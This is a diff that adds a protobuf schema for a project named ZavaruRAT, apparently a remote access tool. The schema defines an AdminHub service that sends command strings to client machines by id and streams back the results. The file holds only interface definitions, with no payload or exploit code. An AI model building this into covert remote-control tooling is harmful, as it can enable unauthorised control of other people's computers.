@@ -1,0 +1,19 @@
+syntax = "proto3";
+
+option csharp_namespace = "ZavaruRAT.Proto";
+package zavarurat;
+
+import "google/protobuf/empty.proto";
+import "events.proto";
+
+service AdminHub {
+  rpc InvokeCommand(InvokeCommandRequest) returns (google.protobuf.Empty);
+
+  rpc CommandResults (google.protobuf.Empty) returns (stream CommandExecutedEvent);
+}
+
+message InvokeCommandRequest {
+  string client_id = 1;
+  string hash_id = 2;
+  string command = 3;
+}
